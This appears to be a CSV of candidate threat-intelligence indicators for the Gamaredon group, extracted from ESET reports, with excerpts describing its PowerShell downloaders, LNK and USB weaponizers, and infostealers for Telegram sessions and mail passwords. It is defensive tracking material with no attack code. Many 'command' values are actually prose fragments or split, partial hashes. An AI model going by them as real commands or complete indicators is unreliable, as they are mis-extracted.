schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:10c0c609ef37df686ad303cb6d5c58046dacbc4e3630c1f34bcd997caba08d48,observation--sha256:4faadb0a710e4b36ee9ca70aa56821725a5627acf272cfdbd4964105d1f58e4b,command,"2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a","2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:d1b48d7fc72e38eac3426569a697d51755e5f11e5e6e68895917981a6906f933,observation--sha256:25edde0fa93db0c3591d744036aa5a1c31569b398609c94ae33ad316c5fb6370,command,2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell,2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:b6fd812d4c069b7f833359f7a4ddbdb8988d8d588386bb2e2916766b2583ab3c,observation--sha256:eabb1742298298c5c7dd502d4f664c04e8d48c4c10ea56065c03273d339fd529,command,2024 PowerShell Exfiltrates files to Dropbox.,2024 PowerShell Exfiltrates files to Dropbox,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Classification First seen Written in Description PteroLNK VBScript version Weaponizer November 2020 VBScript Weaponizes connected USB drives. PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools. PteroBox File stealer November 2024 PowerShell Exfiltrates files to Dropbox. PteroPSDoor File stealer May 2022 PowerShell Exfiltrates files to Gamaredon C&C servers and various cloud storage se",
1.0.0,actor--gamaredon,artifact--sha256:dc555906b6dee7dd78ca62709b7832771792d0f7354129ba64bf976a803fd1dd,observation--sha256:b4ddb26d37dcf344d5017318c4f6533df48d9505b7341362e1eac4398c4efe34,command,20EB4F59F2A8F128255D N/A PowerShell/Pterodo.GA Downloader of PteroBleed.,20EB4F59F2A8F128255D N/A PowerShell/Pterodo.GA Downloader of PteroBleed,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:66f8ba0a13dd29c9977b7ffd45f8d9fe6a5053503e9760abc83b84901d6e9bbe,observation--sha256:af86ec91492274d38b44415352a0fb1f5ca8082f78f74a9acef902c2b27e1599,command,23C1C93FA7DE78F46A3F N/A PowerShell/Agent.BGU PteroPSLoad – PowerShell,23C1C93FA7DE78F46A3F N/A PowerShell/Agent.BGU PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:71a82353d668b45b5d280afba42e80101fbe0655ccac917569db68ce2b745703,observation--sha256:09ad27e2749427bff4632efb68b1c4e66238a4dd91bad94c071a1743ba5700f4,command,2416DFC031CF 0D05054D5BEB9739CBA6470FE585 ) is a PowerShell infostealer ; its main goal is,2416DFC031CF 0D05054D5BEB9739CBA6470FE585 ) is a PowerShell infostealer ; its main goal is,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:74dbf8d5894e7afcb03f30bf1d615ce73ac11accc28f2982e79d6d03cdeb3a9a,observation--sha256:8b13fe197783d2fb7c1149e7cf31334721110dc2aed23e1b32e0259fcde1e0e8,command,259CBD2626562E17670C N/A PowerShell/Pterodo.GA Downloader of PteroSocks.,259CBD2626562E17670C N/A PowerShell/Pterodo.GA Downloader of PteroSocks,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:19f9021fc748884b8255531fccfa20b064c83518247c1034cc067a63cc0d03b8,observation--sha256:b3b4a4f855d13ce00441f5f61b3c4732bf94abf752a501181491b7294135f867,command,27C35E492B2846C06DD6 N/A PowerShell/Pterodo.VP PteroDum – downloads VBScript,27C35E492B2846C06DD6 N/A PowerShell/Pterodo.VP PteroDum – downloads VBScript,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:4954b4dfeeed351caf8c3681d3baae50e6c66976934bb34cb79da983394e9fdc,observation--sha256:2c95307b04344c3cdc0105bb4c6fa55fe4c419885054cb44387ce8f175678dd6,command,2CDB1DA4DF1A33E379C2F24DD6A05709F4848CB6 ) is a PowerShell infostealer designed to extract,2CDB1DA4DF1A33E379C2F24DD6A05709F4848CB6 ) is a PowerShell infostealer designed to extract,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:b2c2f93a9ea7719cc60be1d00ece9af14e2eec9b5bf452e506a114e3491cc183,observation--sha256:a0a58d0b14c1e7b6a412ea3e54505a035a7818bdb2792830cf95a30e295c3329,command,38332C05F3D4171C9DCC N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,38332C05F3D4171C9DCC N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:fe9734cd92ca095578da617615e992340c56068f9bfecb1d93270539b2e69de5,observation--sha256:bdd4d66fdf25650c9bd5da9de28e9906ed707be6de9fd81181b0f04f6a707917,command,3CAC26775D6709DFBBDD N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,3CAC26775D6709DFBBDD N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:4b319c3b57ca6b36756781396eeb8f580996d2fbb6eef0f897e6ab38e5cc699f,observation--sha256:40ed4ab6ea20ed79624b7e34fd9c70e0c795362e356c5ce3758ca819378a8cb3,command,464209F7B5E347810299 N/A PowerShell/Pterodo.PK PowerShell version of PteroLNK –,464209F7B5E347810299 N/A PowerShell/Pterodo.PK PowerShell version of PteroLNK –,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:441146e8ef2d673ca149094072d5d3a993af21019054068f76cd7a1b0611036b,observation--sha256:5905747b127ffb6597a2dbd463d8ea6dc7b977b4865bd267a264a6921fe442f1,command,4801C4CEC227D2B64414 N/A PowerShell/Pterodo.FF PteroDig – LNK weaponizer.,4801C4CEC227D2B64414 N/A PowerShell/Pterodo.FF PteroDig – LNK weaponizer,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:fe1f8d5871c594fc963d7ac7aaf3e1061cff2cb5e2b2e9e5e62d495d97572cef,observation--sha256:c609e959fd3c31a0b4a7c72dee807813acbff90c5be306e1105ce833a4e213b4,command,4DE183E107C5C117FBA1 N/A PowerShell/Pterodo.GE PteroPSLoad – PowerShell,4DE183E107C5C117FBA1 N/A PowerShell/Pterodo.GE PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:ccaf2ac6e174f4f1ae0b7ddeec06a5d667201b4804d507fd5595676f9f315a83,observation--sha256:a9fb4a0772902a4a39de1d827d132f56d6140347bfbe9f90f81f2d551d7cfdcb,command,4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell,4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
